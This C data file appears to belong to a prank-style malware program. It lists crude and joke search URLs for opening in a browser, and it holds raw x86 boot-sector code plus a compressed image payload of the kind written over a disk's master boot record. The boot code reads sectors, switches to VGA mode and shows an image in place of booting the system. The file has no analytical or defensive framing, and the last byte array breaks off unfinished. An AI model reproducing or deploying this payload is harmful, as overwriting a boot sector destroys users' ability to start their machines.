#include "data.h"

const unsigned char msg[] = "0x01 Unassigned Error";

char *sites[] = {
	"http://google.co.ck/search?q=pussy+destroyer",
	"%1cortana+is+the+new+bonzi",
	"%1animated+christmas+tree+for+desktop",
	"%1mp3+midi+converter",
	"%1smileystoolbar+download",
	"%1how+to+get+cursormania+in+2016",
	"%1preventon+antivirus+download",
	"%1limp+bizkit+mp3+download",
	"%1is+bonzi+buddy+a+virus",
	"%1bad+ass+mafia+toolbar",
	"%1cat+desktop",
	"%1myfelix+download",
	"%1cool+toolbars",
	"http://www.youtube.com/results?search_query=tootorals",
	"http://google.co.ck/search?q=succ",
	"%1grand+dad+rom+download",
	"%1bonzi+buddy+download+free",
	"%1free+midi+download",
	"http://google.co.ck/search?q=fuck+bees",
	"http://google.co.ck/search?q=expand+dong",
	"%1smash+mouth+all+star+midi",
	"%1stanky+danky+maymays",
	"%1john+cena+midi+legit+not+converted",
	"%1skrillex+scay+onster+an+nice+sprites+midi",
	"%1snow+halation+midi",
	"http://pcoptimizerpro.com",
};

char *engines[] = {
	"http://google.co.ck/search?q=",
	"http://ask.com/web?q=",
	"http://search.wow.com/search?q=",
	"http://search.yahoo.com/search;?p=",
	"http://www.bing.com/search?q=",
};

const size_t nSites = sizeof(sites) / sizeof(void *);
const size_t nEngines = sizeof(engines) / sizeof(void *);

// Split into 2 parts to save some space.

const unsigned char code1[] = {
	0xBB, 0xE0, 0x07, 0x8E, 0xC3, 0x8E, 0xDB, 0xB8, 0x16, 0x02, 0xB9, 0x02,
	0x00, 0xB6, 0x00, 0xBB, 0x00, 0x00, 0xCD, 0x13, 0x31, 0xC0, 0x89, 0xC3,
	0x89, 0xC1, 0x89, 0xC2, 0xBE, 0x00, 0x00, 0xBF, 0x4D, 0x0E, 0xAC, 0x81,
	0xFE, 0x4D, 0x0E, 0x73, 0x34, 0x3C, 0x80, 0x73, 0x03, 0xE9, 0x10, 0x00,
	0x24, 0x7F, 0x88, 0xC1, 0xAC, 0xAA, 0xFE, 0xC9, 0x80, 0xF9, 0xFF, 0x75,
	0xF7, 0xE9, 0xE2, 0xFF, 0xB4, 0x00, 0x3C, 0x40, 0x72, 0x05, 0x24, 0x3F,
	0x88, 0xC4, 0xAC, 0x89, 0xC1, 0xAD, 0x89, 0xF2, 0x89, 0xFE, 0x29, 0xC6,
	0xAC, 0xAA, 0xE2, 0xFC, 0x89, 0xD6, 0xE9, 0xC5, 0xFF, 0xB8, 0x13, 0x00,
	0xCD, 0x10, 0xBB, 0xE0, 0x07, 0x8E, 0xDB, 0xBE, 0x4D, 0x0E, 0xB4, 0x00,
	0xAC, 0xBB, 0x00, 0x00, 0x89, 0xC1, 0xBA, 0xC8, 0x03, 0x88, 0xD8, 0xEE,
	0x43, 0xBA, 0xC9, 0x03, 0xAC, 0xEE, 0xAC, 0xEE, 0xAC, 0xEE, 0xE2, 0xEE,
	0xBB, 0x00, 0xA0, 0x8E, 0xC3, 0xBF, 0x00, 0x00, 0xB9, 0x00, 0x7D, 0xF3,
	0xA5, 0xF4, 0xE9, 0xFC, 0xFF
};

const unsigned char code2[] = {
	0x55, 0xAA, 0x9B, 0x6E, 0x05, 0x17, 0x36, 0x00, 0x00, 0x00, 0x01, 0x17,
	0x38, 0x3F, 0x21, 0x1A, 0x3F, 0x20, 0x1C, 0x3F, 0x3F, 0x3F, 0x37, 0x00,
	0x00, 0x3F, 0x36, 0x2E, 0x3F, 0x21, 0x18, 0x04, 0x1B, 0x00, 0x9F, 0x16,
	0x3A, 0x3F, 0x20, 0x1C, 0x37, 0x2D, 0x24, 0x2E, 0x24, 0x24, 0x2E, 0x24,
	0x1B, 0x3F, 0x3A, 0x38, 0x3E, 0x28, 0x06, 0x3F, 0x3A, 0x38, 0x3F, 0x33,
	0x31, 0x3A, 0x27, 0x08, 0x3F, 0x22, 0x1D, 0x04, 0x33, 0x00, 0x90, 0x36,
	0x34, 0x3F, 0x36, 0x34, 0x00, 0x00, 0x00, 0x3F, 0x3D, 0x3B, 0x3F, 0x24,
	0x1F, 0x00, 0x16, 0x3B, 0x04, 0x4E, 0x00, 0x81, 0x3F, 0x3F, 0x07, 0x12,
	0x00, 0x8D, 0x2A, 0x02, 0x3A, 0x27, 0x09, 0x3F, 0x39, 0x38, 0x3F, 0x32,
	0x31, 0x3E, 0x28, 0x05, 0x04, 0x21, 0x00, 0x87, 0x00, 0x00, 0x3F, 0x2C,
	0x0A, 0x3F, 0x2D, 0x0A, 0x05, 0x39, 0x00, 0x98, 0x35, 0x3F, 0x2B, 0x00,
	0x3F, 0x2B, 0x06, 0x3E, 0x2A, 0x09, 0x3F, 0x2A, 0x02, 0x3F, 0x29, 0x02,
	0x3F, 0x25, 0x1F, 0x3F, 0x1B, 0x24, 0x3F, 0x2F, 0x0A, 0x04, 0x66, 0x00,
	0x90, 0x2B, 0x06, 0x3F, 0x3D, 0x3B, 0x3D, 0x28, 0x05, 0x3F, 0x33, 0x31,
	0x3F, 0x2D, 0x0A, 0x3A, 0x27, 0x08, 0x04, 0x27, 0x00, 0x9F, 0x22, 0x1D,
	0x3F, 0x21, 0x18, 0x3F, 0x2A, 0x00, 0x3E, 0x2D, 0x0A, 0x3E, 0x2C, 0x0A,
	0x3E, 0x2A, 0x09, 0x00, 0x00, 0x00, 0x3C, 0x2A, 0x09, 0x3F, 0x30, 0x0A,
	0x3E, 0x32, 0x31, 0x3F, 0x2E, 0x07, 0x04, 0x60, 0x00, 0x81, 0x2E, 0x07,
	0x04, 0x4B, 0x00, 0x81, 0x2E, 0x07, 0x04, 0x81, 0x00, 0x81, 0x3F, 0x3F,
	0x04, 0x78, 0x00, 0x84, 0x2C, 0x03, 0x3F, 0x3A, 0x38, 0x04, 0x1B, 0x00,
	0x81, 0x2B, 0x06, 0x04, 0x06, 0x00, 0x8D, 0x31, 0x07, 0x3F, 0x37, 0x37,
	0x3F, 0x39, 0x37, 0x3F, 0x3E, 0x3C, 0x3F, 0x2F, 0x08, 0x04, 0xD8, 0x00,
	0x81, 0x20, 0x1B, 0x04, 0xB7, 0x00, 0x84, 0x3D, 0x3B, 0x3F, 0x22, 0x16,
	0x04, 0x21, 0x00, 0x8D, 0x21, 0x1A, 0x3F, 0x27, 0x21, 0x3F, 0x3F, 0x3E,
	0x3F, 0x25, 0x1E, 0x3F, 0x22, 0x1E, 0x04, 0x3F, 0x00, 0x87, 0x20, 0x1C,
	0x3F, 0x25, 0x20, 0x3F, 0x23, 0x1C, 0x04, 0x96, 0x00, 0x87, 0x23, 0x1A,
	0x3E, 0x2A, 0x09, 0x3E, 0x2A, 0x09, 0x04, 0xDB, 0x00, 0x86, 0x2D, 0x37,
	0x3F, 0x3F, 0x3F, 0x05, 0x18, 0x04, 0x47, 0x01, 0x80, 0x00, 0x04, 0x04,
	0x00, 0x08, 0x08, 0x00, 0x10, 0x10, 0x00, 0x20, 0x20, 0x00, 0x40, 0x40,
	0x40, 0x00, 0x40, 0x80, 0x80, 0x00, 0x41, 0x00, 0x00, 0x01, 0x42, 0x00,
	0x00, 0x02, 0x44, 0x00, 0x00, 0x04, 0x45, 0x1C, 0x1C, 0x05, 0x80, 0x3D,
	0x41, 0x26, 0x27, 0x01, 0x80, 0x01, 0x18, 0x19, 0x00, 0x80, 0x3E, 0x41,
	0x21, 0x3A, 0x01, 0x85, 0x01, 0x06, 0x06, 0x01, 0x01, 0x01, 0x17, 0x41,
	0x01, 0x82, 0x3F, 0x40, 0x32, 0x19, 0x5B, 0x01, 0x41, 0x05, 0x3E, 0x01,
	0x89, 0x07, 0x0E, 0x01, 0x01, 0x01, 0x07, 0x07, 0x07, 0x07, 0x07, 0x15,
	0x43, 0x01, 0x84, 0x32, 0x01, 0x01, 0x26, 0x1E, 0x41, 0x19, 0x42, 0x01,
	0x82, 0x01, 0x07, 0x0C, 0x04, 0x7B, 0x02, 0x05, 0x42, 0x01, 0x83, 0x01,
	0x0C, 0x07, 0x0C, 0x11, 0x29, 0x01, 0x85, 0x01, 0x01, 0x41, 0x18, 0x01,
	0x18, 0x41, 0x17, 0x41, 0x01, 0x83, 0x01, 0x06, 0x06, 0x07, 0x07, 0x3F,
	0x01, 0x06, 0x43, 0x01, 0x81, 0x07, 0x01, 0x04, 0xC3, 0x13, 0x0C, 0x23,
	0x00, 0x84, 0x27, 0x27, 0x01, 0x01, 0x19, 0x04, 0xDD, 0x03, 0x18, 0xE0,
	0x03, 0x40, 0xFE, 0xF8, 0x04, 0x0C, 0x3F, 0x01, 0x81, 0x0C, 0x0E, 0x04,
	0xC3, 0x03, 0x0F, 0x27, 0x01, 0x89, 0x42, 0x28, 0x01, 0x1F, 0x29, 0x01,
	0x1F, 0x01, 0x01, 0x1E, 0x41, 0x11, 0x84, 0x02, 0x82, 0x06, 0x06, 0x0C,
	0x05, 0xFC, 0x04, 0x04, 0x3C, 0x01, 0x05, 0x41, 0x06, 0x81, 0x01, 0x07,
	0x05, 0x10, 0x00, 0x0D, 0x25, 0x00, 0x87, 0x43, 0x01, 0x01, 0x01, 0x29,
	0x33, 0x44, 0x0F, 0x1A, 0x61, 0x06, 0x40, 0xFA, 0xBD, 0x03, 0x04, 0xF4,
	0x04, 0x08, 0xBB, 0x03, 0x06, 0x46, 0x01, 0x04, 0x11, 0x00, 0x80, 0x0C,
	0x0C, 0x25, 0x00, 0x8B, 0x45, 0x01, 0x0F, 0x0F, 0x01, 0x11, 0x01, 0x2A,
	0x16, 0x01, 0x01, 0x01, 0x41, 0x0E, 0x81, 0x02, 0x05, 0x73, 0x02, 0x07,
	0x80, 0x02, 0x80, 0x06, 0x0A, 0x40, 0x01, 0x83, 0x07, 0x06, 0x07, 0x0D,
	0x0B, 0x26, 0x00, 0x8B, 0x34, 0x01, 0x0F, 0x23, 0x17, 0x16, 0x17, 0x12,
	0x17, 0x01, 0x01, 0x46, 0x41, 0x0E, 0x81, 0x02, 0x08, 0x75, 0x07, 0x05,
	0x08, 0x00, 0x80, 0x0E, 0x08, 0x87, 0x07, 0x05, 0xD2, 0x03, 0x0B, 0x24,
	0x00, 0x8A, 0x47, 0x01, 0x01, 0x11, 0x11, 0x01, 0x33, 0x12, 0x12, 0x16,
	0x35, 0x41, 0x0E, 0xBF, 0x03, 0x81, 0x01, 0x06, 0x04, 0x32, 0x01, 0x80,
	0x0C, 0x08, 0xC1, 0x03, 0x81, 0x07, 0x0E, 0x05, 0x0A, 0x00, 0x8A, 0x0E,
	0x01, 0x01, 0x07, 0x0C, 0x2B, 0x48, 0x10, 0x10, 0x10, 0x10, 0x04, 0x04,
	0x00, 0x8E, 0x36, 0x49, 0x01, 0x0F, 0x4A, 0x01, 0x01, 0x4B, 0x01, 0x17,
	0x37, 0x17, 0x01, 0x38, 0x4C, 0x04, 0x12, 0x00, 0x81, 0x2C, 0x4D, 0x41,
	0x06, 0x40, 0x01, 0x80, 0x0D, 0x05, 0x7B, 0x07, 0x05, 0x35, 0x0B, 0x05,
	0x78, 0x02, 0x08, 0xC2, 0x08, 0x04, 0xC3, 0x03, 0x9B, 0x01, 0x20, 0x24,
	0x21, 0x13, 0x13, 0x13, 0x13, 0x13, 0x2D, 0x01, 0x4E, 0x16, 0x01, 0x19,
	0x19, 0x01, 0x01, 0x11, 0x12, 0x16, 0x01, 0x28, 0x39, 0x13, 0x21, 0x24,
	0x2C, 0x41, 0x08, 0xC5, 0x03, 0x83, 0x0D, 0x06, 0x07, 0x0E, 0x05, 0x75,
	0x0C, 0x06, 0x7A, 0x07, 0x09, 0x87, 0x07, 0x80, 0x07, 0x04, 0x0C, 0x05,
	0x82, 0x00, 0x00, 0x2E, 0x05, 0x41, 0x01, 0x82, 0x3A, 0x01, 0x0F, 0x04,
	0x39, 0x06, 0x89, 0x01, 0x1F, 0x01, 0x16, 0x0F, 0x01, 0x01, 0x2D, 0x21,
	0x2E, 0x41, 0x0D, 0x7A, 0x0C, 0x04, 0x3E, 0x01, 0x80, 0x0C, 0x07, 0x3A,
	0x06, 0x0D, 0x87, 0x07, 0x04, 0x63, 0x02, 0x86, 0x20, 0x24, 0x21, 0x39,
	0x2D, 0x28, 0x01, 0x04, 0x7F, 0x07, 0x89, 0x01, 0x0F, 0x22, 0x01, 0x19,
	0x01, 0x4F, 0x01, 0x50, 0x20, 0x41, 0x0E, 0x01, 0x05, 0x05, 0x41, 0x01,
	0x80, 0x0E, 0x0C, 0x41, 0x01, 0x06, 0x05, 0x05, 0x80, 0x06, 0x06, 0xA4,
	0x03, 0x90, 0x2F, 0x38, 0x01, 0x01, 0x35, 0x01, 0x01, 0x22, 0x22, 0x22,
	0x22, 0x01, 0x51, 0x01, 0x18, 0x01, 0x52, 0x41, 0x10, 0xFF, 0x09, 0x05,
	0x40, 0x01, 0x81, 0x07, 0x07, 0x09, 0x44, 0x06, 0x81, 0x01, 0x0C, 0x06,
	0x07, 0x05, 0x80, 0x07, 0x04, 0xC1, 0x03, 0x04, 0x7D, 0x07, 0x84, 0x1F,
	0x53, 0x54, 0x01, 0x18, 0x06, 0x1B, 0x00, 0x81, 0x26, 0x18, 0x41, 0x11,
	0xC0, 0x0D, 0x09, 0x80, 0x02, 0x08, 0x45, 0x06, 0x80, 0x06, 0x04, 0x87,
	0x07, 0x80, 0x0C, 0x04, 0x4F, 0x01, 0x04, 0x05, 0x0F, 0x8D, 0x01, 0x01,
	0x55, 0x01, 0x56, 0x01, 0x01, 0x18, 0x26, 0x01, 0x01, 0x01, 0x1A, 0x25,
	0x04, 0x04, 0x05, 0x41, 0x0A, 0xFA, 0x09, 0x06, 0x07, 0x00, 0x04, 0xF0,
	0x0E, 0x04, 0x2F, 0x06, 0x05, 0x47, 0x01, 0x81, 0x06, 0x06, 0x04, 0x0D,
	0x05, 0x04, 0x02, 0x0F, 0x98, 0x07, 0x06, 0x0C, 0x07, 0x06, 0x0D, 0x01,
	0x01, 0x11, 0x23, 0x57, 0x01, 0x0F, 0x19, 0x01, 0x01, 0x25, 0x14, 0x30,
	0x58, 0x1A, 0x01, 0x0F, 0x23, 0x11, 0x40, 0xDF, 0x41, 0x01, 0x84, 0x09,
	0x02, 0x02, 0x02, 0x02, 0x04, 0x04, 0x00, 0x08, 0x08, 0x00, 0x82, 0x02,
	0x02, 0x02, 0x04, 0x20, 0x25, 0x14, 0x39, 0x0B, 0x05, 0x09, 0x00, 0x07,
	0x40, 0x06, 0x07, 0xC7, 0x03, 0x08, 0x08, 0x00, 0x04, 0x97, 0x02, 0x80,
	0x0E, 0x04, 0x97, 0x0C, 0x90, 0x11, 0x12, 0x12, 0x2A, 0x17, 0x01, 0x01,
	0x01, 0x14, 0x30, 0x01, 0x1A, 0x01, 0x01, 0x16, 0x37, 0x17, 0x0C, 0x40,
	0x01, 0x0D, 0x6D, 0x00, 0x80, 0x09, 0x10, 0x10, 0x00, 0x13, 0x20, 0x00,
	0x80, 0x59, 0x07, 0x8B, 0x00, 0x04, 0x19, 0x00, 0x80, 0x09, 0x0D, 0x1F,
	0x00, 0x14, 0xA4, 0x00, 0x40, 0x74, 0x3F, 0x01, 0x85, 0x0A, 0x08, 0x03,
	0x03, 0x03, 0x03, 0x04, 0x04, 0x00, 0x08, 0x08, 0x00, 0x82, 0x03, 0x08,
	0x0A, 0x13, 0x9D, 0x00, 0x09, 0x40, 0x01, 0x80, 0x0D, 0x04, 0x35, 0x0B,
	0x0B, 0x3A, 0x01, 0x86, 0x01, 0x07, 0x0C, 0x07, 0x07, 0x0C, 0x0C, 0x09,
	0x14, 0x0A, 0x85, 0x11, 0x17, 0x12, 0x23, 0x0F, 0x5A, 0x04, 0x3D, 0x01,
	0x86, 0x25, 0x01, 0x01, 0x0F, 0x12, 0x12, 0x11, 0x0A, 0x03, 0x05, 0x0D,
	0x6D, 0x00, 0x81, 0x08, 0x02, 0x10, 0x10, 0x00, 0x13, 0x20, 0x00, 0x81,
	0x5B, 0x02, 0x06, 0x3A, 0x00, 0x84, 0x02, 0x08, 0x03, 0x08, 0x02, 0x0C,
	0x1F, 0x00, 0x15, 0xA4, 0x00, 0x40, 0x75, 0x3F, 0x01, 0x84, 0x0B, 0x04,
	0x04, 0x04, 0x04, 0x04, 0x04, 0x00, 0x08, 0x08, 0x00, 0x81, 0x04, 0x0B,
	0x14, 0x9D, 0x00, 0x08, 0x2E, 0x06, 0x05, 0xC3, 0x08, 0x06, 0x04, 0x0A,
	0x07, 0x80, 0x16, 0x81, 0x07, 0x0C, 0x0D, 0x54, 0x10, 0x05, 0xBB, 0x0D,
	0x8B, 0x01, 0x01, 0x14, 0x3B, 0x3B, 0x14, 0x01, 0x5C, 0x01, 0x2A, 0x12,
	0x11, 0x05, 0x1A, 0x0A, 0x12, 0x6D, 0x00, 0x80, 0x03, 0x04, 0x10, 0x01,
	0x10, 0x10, 0x00, 0x10, 0x10, 0x00, 0x80, 0x5D, 0x08, 0x40, 0x01, 0x84,
	0x03, 0x04, 0x03, 0x02, 0x02, 0x0B, 0x1F, 0x00, 0x15, 0xA4, 0x00, 0x40,
	0x86, 0x3F, 0x01, 0x04, 0x9D, 0x00, 0x07, 0xB7, 0x00, 0x13, 0x41, 0x01,
	0x80, 0x0D, 0x07, 0x41, 0x01, 0x05, 0x74, 0x07, 0x82, 0x0E, 0x07, 0x0E,
	0x04, 0x3C, 0x01, 0x80, 0x0C, 0x04, 0xC0, 0x03, 0x80, 0x06, 0x06, 0x0F,
	0x19, 0x90, 0x01, 0x01, 0x5E, 0x01, 0x01, 0x5F, 0x01, 0x60, 0x03, 0x03,
	0x61, 0x14, 0x25, 0x01, 0x19, 0x29, 0x11, 0x05, 0xAE, 0x0C, 0x07, 0x45,
	0x02, 0x81, 0x0B, 0x0B, 0x08, 0x40, 0x02, 0x80, 0x0B, 0x06, 0x10, 0x01,
	0x10, 0x10, 0x00, 0x10, 0x10, 0x00, 0x80, 0x03, 0x07, 0x26, 0x01, 0x06,
	0x40, 0x01, 0x81, 0x03, 0x04, 0x0A, 0x20, 0x00, 0x15, 0xA4, 0x00, 0x40,
	0x70, 0x40, 0x01, 0x0C, 0xD2, 0x01, 0x0C, 0x41, 0x01, 0x80, 0x03, 0x12,
	0x9C, 0x00, 0x04, 0x4B, 0x16, 0x08, 0x83, 0x02, 0x0B, 0x7D, 0x07, 0x07,
	0xCC, 0x08, 0x04, 0x3E, 0x01, 0x80, 0x0C, 0x04, 0x41, 0x01, 0x81, 0x00,
	0x00, 0x04, 0xFA, 0x04, 0x07, 0x29, 0x00, 0x80, 0x1A, 0x07, 0x9F, 0x16,
	0x07, 0x41, 0x01, 0x04, 0x05, 0x01, 0x80, 0x0A, 0x06, 0xBE, 0x04, 0x80,
	0x0A, 0x07, 0x10, 0x01, 0x10, 0x10, 0x00, 0x10, 0x10, 0x00, 0x08, 0x67,
	0x02, 0x08, 0x40, 0x01, 0x0D, 0x20, 0x00, 0x40, 0x83, 0x40, 0x01, 0x80,
	0x03, 0x15, 0x3F, 0x01, 0x11, 0x9C, 0x00, 0x08, 0xEE, 0x18, 0x08, 0xF1,
	0x0E, 0x83, 0x01, 0x07, 0x07, 0x0C, 0x05, 0x6E, 0x02, 0x09, 0x05, 0x05,
	0x07, 0x40, 0x01, 0x86, 0x00, 0x00, 0x62, 0x01, 0x14, 0x63, 0x64, 0x07,
	0x6D, 0x01, 0x84, 0x14, 0x1A, 0x01, 0x27, 0x2C, 0x04, 0x1A, 0x05, 0x06,
	0x41, 0x01, 0x05, 0x05, 0x01, 0x0B, 0xD0, 0x04, 0x0C, 0x10, 0x00, 0x08,
	0x20, 0x01, 0x0F, 0x10, 0x00, 0x08, 0x41, 0x01, 0x15, 0x20, 0x00, 0x40,
	0xA7, 0x40, 0x01, 0x0C, 0xAA, 0x0D, 0x10, 0xB4, 0x0D, 0x04, 0x78, 0x07,
	0x04, 0x53, 0x10, 0x83, 0x06, 0x06, 0x06, 0x06, 0x04, 0x04, 0x00, 0x04,
	0xFB, 0x13, 0x82, 0x14, 0x03, 0x3C, 0x07, 0xE7, 0x12, 0x84, 0x3C, 0x65,
	0x01, 0x3A, 0x10, 0x0A, 0x81, 0x02, 0x0B, 0xF5, 0x00, 0x05, 0x50, 0x07,
	0x23, 0x40, 0x01, 0x82, 0x0B, 0x03, 0x15, 0x05, 0x41, 0x01, 0x40, 0x9E,
	0x40, 0x01, 0x09, 0x56, 0x04, 0x80, 0x03, 0x07, 0xCF, 0x03, 0x0C, 0x9C,
	0x00, 0x07, 0xA4, 0x03, 0x11, 0x41, 0x01, 0x81, 0x0E, 0x0C, 0x04, 0x3F,
	0x01, 0x04, 0x02, 0x05, 0x04, 0xC8, 0x03, 0x09, 0x40, 0x01, 0x82, 0x66,
	0x01, 0x67, 0x08, 0x74, 0x01, 0x86, 0x0C, 0x07, 0x07, 0x01, 0x68, 0x24,
	0x07, 0x04, 0x6F, 0x15, 0x04, 0x9A, 0x02, 0x08, 0xF5, 0x00, 0x08, 0x86,
	0x08, 0x05, 0x40, 0x01, 0x10, 0xC0, 0x03, 0x10, 0x50, 0x01, 0x81, 0x1B,
	0x08, 0x05, 0x41, 0x01, 0x40, 0x9D, 0x40, 0x01, 0x81, 0x0B, 0x08, 0x07,
	0xC6, 0x00, 0x81, 0x1C, 0x1B, 0x07, 0x90, 0x02, 0x0A, 0x9C, 0x00, 0x09,
	0xA3, 0x03, 0x0D, 0x71, 0x11, 0x11, 0x4D, 0x01, 0x09, 0x40, 0x01, 0x81,
	0x20, 0x69, 0x04, 0x2A, 0x01, 0x08, 0x16, 0x00, 0x84, 0x07, 0x07, 0x2F,
	0x6A, 0x20, 0x06, 0x9F, 0x02, 0x80, 0x01, 0x09, 0xF5, 0x00, 0x80, 0x02,
	0x06, 0x86, 0x08, 0x05, 0xC0, 0x03, 0x0E, 0x30, 0x06, 0x13, 0x40, 0x01,
	0x81, 0x1C, 0x0A, 0x05, 0x41, 0x01, 0x40, 0x9D, 0x40, 0x01, 0x08, 0xE5,
	0x06, 0x0A, 0x4F, 0x06, 0x09, 0x9C, 0x00, 0x80, 0x0D, 0x07, 0x7D, 0x02,
	0x14, 0x81, 0x02, 0x13, 0x40, 0x01, 0x83, 0x01, 0x00, 0x10, 0x2F, 0x0B,
	0xF2, 0x03, 0x04, 0xD7, 0x08, 0x81, 0x2E, 0x10, 0x09, 0xF9, 0x08, 0x08,
	0x40, 0x01, 0x06, 0xA5, 0x01, 0x06, 0xE0, 0x04, 0x0C, 0xF4, 0x07, 0x15,
	0x90, 0x02, 0x80, 0x09, 0x05, 0x41, 0x01, 0x80, 0x1C, 0x40, 0x9D, 0x40,
	0x01, 0x08, 0x95, 0x04, 0x80, 0x0A, 0x08, 0xD1, 0x00, 0x08, 0x12, 0x00,
	0x05, 0x7D, 0x02, 0x07, 0xAC, 0x0D, 0x09, 0x7D, 0x07, 0x15, 0x13, 0x05,
	0x08, 0xBF, 0x03, 0x80, 0x2B, 0x11, 0x1E, 0x00, 0x80, 0x2B, 0x05, 0xE8,
	0x21, 0x0B, 0xF5, 0x00, 0x05, 0x80, 0x02, 0x07, 0x70, 0x02, 0x04, 0x80,
	0x02, 0x04, 0xB4, 0x01, 0x80, 0x0B, 0x04, 0x11, 0x0B, 0x16, 0x90, 0x02,
	0x05, 0x41, 0x01, 0x80, 0x1B, 0x40, 0xA4, 0x40, 0x01, 0x0A, 0xCE, 0x08,
	0x07, 0x12, 0x00, 0x04, 0xC2, 0x04, 0x09, 0x6C, 0x0C, 0x09, 0x47, 0x02,
	0x10, 0x53, 0x15, 0x0A, 0x40, 0x01, 0x07, 0x22, 0x0F, 0x0D, 0x5A, 0x15,
	0x05, 0x1C, 0x00, 0x06, 0x67, 0x24, 0x0B, 0x00, 0x05, 0x0B, 0xB0, 0x08,
	0x05, 0x83, 0x0A, 0x82, 0x03, 0x0A, 0x02, 0x05, 0xE5, 0x04, 0x0D, 0xC4,
	0x06, 0x08, 0x30, 0x00, 0x82, 0x0A, 0x08, 0x15, 0x15, 0xE0, 0x03, 0x40,
	0x8F, 0x40, 0x01, 0x04, 0x7F, 0x02, 0x80, 0x0B, 0x06, 0x42, 0x06, 0x08,
	0x40, 0x01, 0x04, 0x68, 0x0C, 0x07, 0x40, 0x01, 0x0A, 0xFD, 0x09, 0x17,
	0x99, 0x0C, 0x08, 0x9E, 0x0C, 0x11, 0x9A, 0x02, 0x10, 0x80, 0x02, 0x0F,
	0x70, 0x07, 0x05, 0xC4, 0x0B, 0x05, 0x43, 0x04, 0x18, 0x10, 0x05, 0x06,
	0xE6, 0x0B, 0x40, 0xA1, 0x40, 0x01, 0x04, 0x7F, 0x02, 0x80, 0x03, 0x06,
	0x42, 0x06, 0x06, 0x12, 0x00, 0x04, 0x19, 0x1A, 0x06, 0xA9, 0x12, 0x09,
	0x3F, 0x06, 0x04, 0x47, 0x0B, 0x1C, 0x40, 0x01, 0x15, 0x3E, 0x01, 0x81,
	0x06, 0x06, 0x06, 0xDC, 0x1C, 0x17, 0x70, 0x07, 0x04, 0x1F, 0x01, 0x05,
	0xE7, 0x09, 0x19, 0x90, 0x07, 0x06, 0x63, 0x01, 0x0E, 0x20, 0x05, 0x40,
	0x86, 0x80, 0x0C, 0x0D, 0x40, 0x01, 0x05, 0xEF, 0x0B, 0x0D, 0x40, 0x01,
	0x80, 0x06, 0x04, 0x62, 0x1B, 0x0D, 0x3B, 0x06, 0x12, 0xF1, 0x27, 0x0F,
	0x80, 0x02, 0x06, 0xCF, 0x03, 0x0C, 0xC1, 0x03, 0x08, 0x7F, 0x02, 0x1D,
	0x60, 0x02, 0x04, 0x41, 0x01, 0x1A, 0x10, 0x0A, 0x04, 0x1B, 0x03, 0x0E,
	0xC0, 0x0D, 0x06, 0x17, 0x0A, 0x40, 0x8C, 0x40, 0x01, 0x05, 0xA4, 0x00,
	0x04, 0xE9, 0x06, 0x0B, 0x40, 0x01, 0x80, 0x0D, 0x04, 0xE3, 0x0E, 0x04,
	0x80, 0x08, 0x0C, 0x22, 0x01, 0x1E, 0x40, 0x01, 0x0F, 0x11, 0x00, 0x05,
	0x80, 0x02, 0x80, 0x0D, 0x09, 0x00, 0x0F, 0x11, 0x70, 0x07, 0x09, 0x60,
	0x02, 0x0C, 0x10, 0x00, 0x1B, 0x90, 0x0C, 0x40, 0x8D, 0x3F, 0x10, 0x0D,
	0x40, 0x01, 0x05, 0xBF, 0x03, 0x07, 0xA4, 0x00, 0x09, 0x5C, 0x04, 0x06,
	0x02, 0x01, 0x0C, 0x11, 0x01, 0x0C, 0x67, 0x20, 0x16, 0x40, 0x01, 0x0D,
	0x82, 0x02, 0x05, 0x80, 0x02, 0x07, 0xB5, 0x02, 0x0E, 0x9F, 0x12, 0x81,
	0x0A, 0x09, 0x05, 0xC5, 0x0D, 0x09, 0x1A, 0x00, 0x81, 0x08, 0x02, 0x0A,
	0x10, 0x00, 0x07, 0xE0, 0x0D, 0x10, 0x10, 0x00, 0x40, 0x91, 0xBF, 0x12,
	0x0B, 0x2E, 0x01, 0x05, 0x3E, 0x06, 0x05, 0x04, 0x02, 0x09, 0x40, 0x01,
	0x04, 0x6B, 0x11, 0x17, 0xD7, 0x04, 0x11, 0x80, 0x07, 0x0D, 0x18, 0x00,
	0x11, 0x40, 0x01, 0x04, 0x81, 0x3A, 0x12, 0x3F, 0x15, 0x06, 0x15, 0x15,
	0x0A, 0xD0, 0x0D, 0x10, 0x10, 0x00, 0x14, 0x20, 0x00, 0x40, 0x8E, 0x3F,
	0x15, 0x0B, 0x2E, 0x01, 0x05, 0x7F, 0x02, 0x05, 0x84, 0x04, 0x0A, 0xC0,
	0x03, 0x81, 0x00, 0x00, 0x04, 0x7D, 0x02, 0x12, 0x7A, 0x0C, 0x0E, 0x84,
	0x02, 0x23, 0x40, 0x01, 0x11, 0xB5, 0x02, 0x40, 0xC7, 0xBD, 0x17, 0x0C,
	0x40, 0x01, 0x05, 0x7F, 0x02, 0x0F, 0x12, 0x0A, 0x81, 0x00, 0x06, 0x14,
	0x3F, 0x01, 0x04, 0x75, 0x02, 0x0B, 0x12, 0x01, 0x13, 0x97, 0x02, 0x0B,
	0x57, 0x0B, 0x07, 0xBC, 0x0D, 0x40, 0xE0, 0x40, 0x01, 0x06, 0x3E, 0x06,
	0x08, 0xC4, 0x0A, 0x08, 0x40, 0x01, 0x04, 0x3C, 0x01, 0x11, 0x40, 0x01,
	0x0C, 0xCD, 0x17, 0x17, 0x40, 0x01, 0x06, 0xA7, 0x25, 0x08, 0x7F, 0x02,
	0x40, 0xE4, 0x40, 0x01, 0x06, 0x3E, 0x06, 0x10, 0x92, 0x0C, 0x11, 0x3E,
	0x06, 0x0A, 0x3F, 0x01, 0x13, 0x6D, 0x02, 0x0D, 0x40, 0x01, 0x05, 0x7B,
	0x01, 0x05, 0x05, 0x00, 0x40, 0xE4, 0x40, 0x01, 0x07, 0x3E, 0x06, 0x0F,
	0x40, 0x01, 0x80, 0x0D, 0x04, 0x48, 0x02, 0x0F, 0x40, 0x01, 0x0A, 0x32,
	0x01, 0x07, 0xC3, 0x03, 0x07, 0x0D, 0x00, 0x0F, 0x57, 0x06, 0x07, 0xD3,
	0x0D, 0x07, 0x85, 0x02, 0x40, 0xE1, 0x40, 0x01, 0x07, 0x3E, 0x06, 0x0E,
	0x40, 0x01, 0x04, 0x2E, 0x0B, 0x06, 0x7E, 0x0D, 0x0F, 0x62, 0x02, 0x0B,
	0x47, 0x06, 0x17, 0x58, 0x06, 0x17, 0xAC, 0x07, 0x40, 0xD8, 0x40, 0x01,
	0x09, 0x7F, 0x02, 0x0C, 0x40, 0x01, 0x04, 0x11, 0x01, 0x04, 0x3D, 0x01,
	0x09, 0x41, 0x01, 0x04, 0x08, 0x00, 0x1D, 0xB3, 0x0D, 0x10, 0x5E, 0x33,
